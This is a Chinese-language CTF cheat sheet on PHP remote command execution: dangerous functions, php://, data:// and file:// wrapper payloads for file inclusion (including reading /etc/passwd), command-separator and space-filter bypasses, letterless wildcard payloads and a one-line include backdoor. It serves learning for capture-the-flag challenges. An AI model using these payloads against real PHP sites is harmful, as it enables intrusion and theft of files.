# 绕过 命令执行的过滤,函数

> [PHP官网](https://www.php.net/)    查看各类函数

访问 [Rot13AtbaseBase64编码解码](https://xobear.cn/CTF/Web/PHP/rot13base.html)

## 常见命令

PHP 核心：var\_dump、include、file\_get\_contents、system、eval、phpinfo
Linux 核心：cat、ls、find、id、pwd

1.输出/打印

```
var_dump($var);       // 最常用：输出变量类型+值+长度，调试神器
print_r($var);        // 打印数组/对象结构
echo $var;            // 直接输出字符串
var_export($var);     // 输出可执行的PHP代码
printf($fmt, $var);   // 格式化输出（绕过过滤常用）
```

2.文件读取/包含类(伪协议搭配)

```
include $_GET['file'];// 文件包含漏洞本体
require $_GET['file'];
include_once; require_once;

file_get_contents($f);// 读文件内容（读源码/flag）
file_put_contents($f,$d);// 写文件（写马）
readfile($f);         // 直接输出文件内容（无回显绕过神器）
fopen(); fread();     // **文件指针读写**
```

3.命令执行

```
system('id');         // 执行命令+直接输出结果
exec('id');           // 执行命令，只返回最后一行
shell_exec('id');     // 反引号 `id` 等价，返回全部结果
passthru('id');       // 执行命令+输出二进制流
popen('id', 'r');     // 打开进程管道
```

4.信息获取查

```
phpinfo();            // 调试pyload是否可用。看PHP配置、禁用函数、路径、版本（必用）
ini_get('xxx');       // 获取php.ini配置
getcwd();             // 当前工作路径
scandir('./');        // 列出目录文件
dirname(__FILE__);    // 取文件目录
```

\--|----|--5.编码解码

```
base64_encode(); base64_decode();
urldecode(); urlencode();
str_rot13();          // 绕过关键字过滤
eval();               // *常用  执行PHP代码（一句话木马核心）
assert();             // 断言=执行代码（绕过disable_functions常用）
```

6.其他

```
ini_set('display_errors',1); // 开启报错
error_reporting(E_ALL);      // 显示所有错误
md5(); sha1();        // 哈希
isset(); empty();     // 判断变量
```

7.Linux系统命令

```
whoami          // 查看当前用户 * 常用 
ls              // 列出目录内容 * 常用 
pwd             // 显示当前工作目录 * 常用 
cat             // 查看文件内容
echo            // 输出字符串 * 常用 
mkdir           // 创建目录
rm              // 删除文件或目录
cp              // 复制文件或目录
mv              // 移动或重命名文件或目录 * 常用 
cat flag.php    // 读文件
tac flag.php    // 倒着读（绕过cat过滤） * 常用 
more flag       // 分页读
less flag       // 分页读
head flag       // 读前10行
tail flag       // 读后10行
nl flag         // 带行号读
od -c flag      // 二进制读
```

8.通配符  转义

```
*   匹配任意字符（除换行符外）
?   匹配单个字符 (常用于占位)
[]  匹配括号内的任意一个字符
[^] 匹配不在括号内的任意一个字符
\   转义特殊字符
```

| 符号  | 含义    | URL |
| --- | ----- | --- |
| \ n | 换行    | %0A |
| \ r | 回车    | %0D |
| \ t | 水平制表符 | %09 |
| \ ; | 分号    | %3B |
| \ = | 等于号   | %3D |
| \ # | #号    | %23 |
| \\  | 空格    | %20 |
| \ ? | 问号    | %3F |
| \\  | 右斜杠   | %2F |

## 0x1: preg_match()函数

执行一个正则表达式匹配.***经常与if搭配用于过滤***


```
// 正确的过滤写法：只允许字母数字
if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    die('非法字符！只允许字母和数字'); // 不匹配白名单，直接拦住
}
// 匹配白名单，才继续执行
echo '合法输入：' . $input;


格式：int preg_match ( string $pattern , mixed $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] )


preg_match($pattern, $subject, $matches);

String $pattern 正则表达式模式 (pattern='/      /')
String $subject 要匹配的字符串
String $matches 如果提供了matches,它将被填充为搜索到的匹配项

```

## 0x2: require和include

require和include都是PHP中的文件包含函数，用于在脚本中包含和执行指定文件的内容。
二者区别在于处理错误的方式不同

1.require语句在执行时会检查文件是否存在，如果文件不存在则会生成一个致命错误（E\_COMPILE\_ERROR），**并停止脚本执行**

`require 'filename.php';`

2.include语句在执行时会检查文件是否存在，如果文件不存在则会生成一个警告（E\_WARNING），**但脚本会继续执行**

`include 'filename.php';`

## 0x3: system()函数

执行一个外部程序

```

格式：int system ( string $command )
system($command);
String $command 要执行的命令

```

不需要使用括号的函数

```
echo
print
isset
include
reuqire
```

## 0x4: file\_get\_contents()函数

读取文件内容

```

格式：string file_get_contents ( string $filename [, bool $use_include_path = FALSE [, resource $context [, int $offset = 0 [, int $maxlen ]]]] )

file_get_contents($filename);

String $filename 文件路径
bool $use_include_path 是否使用 include_path 搜索
resource $context 流上下文
int $offset 起始偏移量
int $maxlen 最大长度

```

## 0x5: 伪协议

PHP 伪协议（又称流包装器）是 PHP 内建的资源访问机制，以`协议://资源`的 URL 格式，让`include、file_get_contents`等函数统一操作本地文件、远程资源、内存流、压缩包等不同数据源。**CTF 与代码审计中，它是文件包含、代码执行、源码泄露的核心利用手段。**

| 协议                           | 核心能力                                | 关键条件 / 限制                                      | 典型利用示例                                                                 |
| ---------------------------- | ----------------------------------- | ---------------------------------------------- | ---------------------------------------------------------------------- |
| php\://filter/convert.base64 | 读取任意文件 / 处理文件源码（Base64 编码绕过执行）      | 无需开启远程配置                                       | ?file=php\://filter/read=convert.base64-encode/resource=index.php      |
| php\://input                 | 读取 POST 原始数据，配合包含 **执行代码**          | 需allow\_url\_include=On；不支持multipart/form-data | URL：?file=php\://inputPOST：<?php system('id');?>                       |
| data://text/plain,           | 内联数据直接执行（URL 嵌入代码）                  | 需allow\_url\_include=On（PHP≥5.2.0）             | ?file=data://text/plain,<?php system('id');?>                          |
| file://                      | 访问本地文件系统（绝对 / 相对路径）                 | 不受远程配置限制（双 OFF 可用）                             | ?file=file:///etc/passwd（Linux）/ file://C:/windows/system.ini（Windows） |
| zip\:///phar://              | 读取压缩包内文件（绕过后缀限制 / WAF）	压缩包为 ZIP 格式； | phar://需phar.readonly=Off                      | zip\:///tmp/shell.zip%23shell.php（%23为#URL 编码）                         |

### data://text/plain

`data://text/plain,base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+`
base64->`<?php system("tac flag.php")?>`-->`data://text/plain,<?php system("tac flag.php")?>`

## 0x6 system($c.">/dev/null 2>&1"); 无回显

拆解：

`/dev/null` 是Linux的黑洞，写入的所有数据都会被丢弃不会保存

`>` 重定向符 把**标准输出（stdout,文件描述符 1）** 写入到后面的文件/设备 （把命令正常输出丢进黑洞导致没有回显）

`2>&1` 把 **标准错误（stderr，文件描述符 2）** 重定向到「标准输出 1 指向的位置」
把错误输出绑定到标准输出（也就是 /dev/null）。

常见的「无回显命令执行」写法，执行 $c 对应的系统命令，但不把任何结果输出到页面，用来绕过页面回显检测、隐藏执行痕迹。

**可以使用结束符来截断">/dev/null 2>&1"**

**`;`**  **`&&`**  **`||`**  **`#`**

&& 和 || 在系统命令里也是结束符：本质是它们会分隔命令，让 Shell 把一行拆成多条命令执行，是命令执行的核心绕过手段

| 分隔符     | 作用    | 执行逻辑                         | CTF 实战场景                                          |
| ------- | ----- | ---------------------------- | ------------------------------------------------- |
| ;（分号）   | 顺序执行符 | 无论前面的命令执行成功 / 失败，后面的命令一定会执行  | 最通用的分隔符，比如 id;whoami 会依次执行两个命令                    |
| &&（逻辑与） | 成功执行符 | 只有前面的命令执行成功（返回码 0），后面的命令才会执行 | 用来做条件执行，比如 ls /flag && cat /flag，只有找到 flag 文件才会读取 |

| `||` 逻辑或 | 失败执行符 |只有前面的命令执行失败（返回码非 0），后面的命令才会执行|   |

```
命令A || 命令B
执行 命令A，拿到它的退出状态码（Linux 命令执行成功返回 0，失败返回非 0）
如果 命令A 执行失败（状态码≠0），就执行 命令B
如果 命令A 执行成功（状态码 = 0），直接跳过 命令B，不执行
```

`|`：管道符，前命令的输出作为后命令的输入

` `` ` ：反引号包裹的命令会被 Shell 先执行，结果替换到原位置

```
Shell 会先执行反引号内部的命令，拿到命令的输出结果
用这个结果完全替换掉反引号包裹的内容，再执行最终的命令
等价写法：$(命令)（现代 Shell 推荐，可读性更好，可嵌套）

##先执行`whoami`，拿到当前用户名（比如root），再执行echo root

echo `whoami`
等价与：echo $(whoami)
```

| 命令  | 作用               | 核心特点                     | 用途                                                  |
| --- | ---------------- | ------------------------ | --------------------------------------------------- |
| cat | concatenate（拼接）  | 按文件正常顺序输出全部内容            | 最常用的读文件命令，cat /flag.php 直接读取 flag  。需要ctrl+u查看源码    |
| tac | cat 的反向拼写        | 按文件倒序输出内容（最后一行变第一行）      | 绕过过滤：如果 WAF 拦截 cat，用 tac /flag。php 替代               |
| nl  | number lines（行号） | 输出文件内容，同时给**每一行加行号显示**   | 带行号读文件，比如 nl /etc/passwd 查看带行号的用户列表                 |
| cut | 截取命令             | cut -c 按字符截取、cut -f 按列截取 | 提取文件特定内容，比如 `cat /flag	cut -c1-10` 读取 flag 前 10 个字符 |

「nl 不支持 ? \* 等通配符」：nl 本身不支持通配符展开，通配符是 Shell 的特性，nl a\* 能生效是 Shell 先把 a\* 展开成匹配的文件名，再传给 nl，不是 nl 本身支持。

其他替代读文件命令（CTF 绕过常用）：more less head tail od xxd 等，都可以用来绕过 cat 过滤。

一个shell特性：两个单引号''分割的字符串会自动忽略''  `'ca''t flag.php'`->`'cat flag.php'`

## 0x7 空格被过滤了

preg_match过滤空格
1.`$IFS`或`${IFS}`:SHELL环境变量 **内部字段分割符**。默认值包含空格 制表符 换行符
对于用到空格的命令，shell解析时会自动替换为空格

2.重定向符 `<` 或`>` shell自动处理重定向符号

```
tac<./flag.php
利用输入重定向，把 ./flag.php 作为tac的标准输入
```

3.制表符 `$'\t'`  ` \t` `%09` 制表符与空格一样

4.命令分组 **把一堆命令当成一个整体来处理**在shell中主要有两种写法`( )`和`{ }`

当空格被过滤时，用命令分组来写无空格 payload。
(tac,flag.php)
{tac,flag.php}

```
多个命令下的区别
1️⃣ 小括号 ( command1; command2; ) —— 子 Shell 分组

在 子 Shell 进程 中执行命令
不会影响当前 Shell 的环境（变量、目录等）
语法比较宽容：最后一个命令后面可以加分号也可以不加
临时切换目录、执行一串命令，又不想影响父 Shell
命令流水线里做临时环境切换
变量局部化（子 Shell 里的变量不会外泄）

2️⃣ 花括号 { command1; command2; } —— 当前 Shell 分组

在 当前 Shell 进程 执行命令
会修改当前 Shell 的环境（变量、目录都会生效）
语法要求非常严格（这是新手最容易踩坑的地方）


运行
{ command1; command2; }
要求：
{ 后面必须跟一个 空格
} 前面必须有 分号；（可选并非必须，但为了安全与兼容，建议加）
} 前后都必须有 空格
```

## 0x8 禁用字母（小）

[参考无字母shell](https://blog.csdn.net/qq_61839115/article/details/128446902?spm=1001.2101.3001.6650.2\&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-128446902-blog-141113303.235%5Ev43%5Epc_blog_bottom_relevance_base7\&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-128446902-blog-141113303.235%5Ev43%5Epc_blog_bottom_relevance_base7)
异或/或/取反/自增/上传文件
过滤`小写字母  换行  制表符  PATH  BASH  HOME  \  ()  []  \\  +  -  =  ^  *  & % < > ' "`

```
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}

```

### 没有**过滤数字**的无字母 RCE，使用 ANSI-C 风格的转义，格式为 **$'...'** ，省略号中用八进制

[ANSI-C在线编码](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)注意编码后的是16进制，还需要转为八进制

### 没有字母就截取环境变量的字母

**shell变量截取-->字母**

```
$VAR="abc"
echo ${VAR:0:1}--->a
echo ${VAR:1:1}--->b
echo ${VAR:2:1}--->c
```

`${VAR:offest:length}`**从offest位置截取length长度的字符**

**变量长度-->数字**

```
$VAR="abc"
$SUM="asbxasj"
echo ${#VAR}--->3
echo ${#SUM}--->7    
```

`${#VAR}`**获取变量长度**

常见的环境变量名

| 变量名              | 位置及用处                                    |
| ---------------- | ---------------------------------------- |
| $PWD             | 当前工作目录(./var/www/html)                   |
| $SHLVL           | shell嵌套层级（默认值为1，2）本身就是纯数字${$SHLVL}->数字1  |
| $RANDOM          | 生成随机数（0-32767） ${#RANDOM}->取位数 用于Bash环境下 |
| $UID             | 当前用户UID(33->www-data   0->root)          |
| $USER            | 当前用户名                                    |
| $HOME            | 当前用户家目录(/home)                           |
| $SHELL           | 当前用户登录shell                              |
| $PATH            | 可执行文件搜索路径(./binsh)                       |
| $IFS             | 内部字段分割符                                  |
| $0               | 当前脚本名称                                   |
| $1-$9            | 脚本参数                                     |
| $@               | 所有参数                                     |
| $#               | 参数个数                                     |
| ${OPTIND}        | 当前选项索引                                   |
| ${OPTARG}        | 当前选项参数                                   |
| ${FUNCNAME}      | 当前函数名称                                   |
| ${BASH\_SOURCE}  | 当前脚本名称                                   |
| ${BASH\_LINENO}  | 当前行号                                     |
| ${BASH\_VERSION} | Bash版本                                   |
| ${OSTYPE}        | 操作系统类型                                   |
| ${MACHTYPE}      | 机器类型                                     |

## 0x9 过滤字母但没有过滤数字

1.文件上传->RCE漏洞
2.尝试使用/bin目录下的可执行程序。字母用不了需要使用通配符？来占位。
`URL?c=./bin/base64%20flag.php`----->`?c=./???/????64%20????.???`  :将文件base64编码后输出
文件上传在一个临时目录当中结束后会删除

在Linux中 `.`是可以执行脚本的

### 如果过滤了数字

`URL?c=.%20/???/????????[@-[]`


在Linux中的shell
echo$(())--->代表数学运算，并且

`echo$(())   ----->0`
`~`在shell 的 $(())里面是按位取反

`echo$((~$(())))  ----> -1`这里 0的取反是 -1
```
0的补码是4x8个0   00000000 00000000 00000000 00000000
全部取反后4x8个1  11111111 11111111 11111111 11111111
对应的十进制数是 -1
```
既然有了-1 那么数字就可以使用了

```
补充：
echo ${#} --->0
echo ${##} --->1
echo $((${##}+${##}))----> 2
```




## 0x10 禁用函数
先查phpinfo()看看禁用了那些函数
如果phpinfo()被禁用了那只能盲猜了

file_get_contents('')读取文件（远程文件获取）

多尝试include()参数逃逸
```
php文件包含+php伪协议
一句话后门(POST/GET) c=include($_GET['1']);
url/? 1=php://filter/convert.base64-encode/resource=flag.php
```



















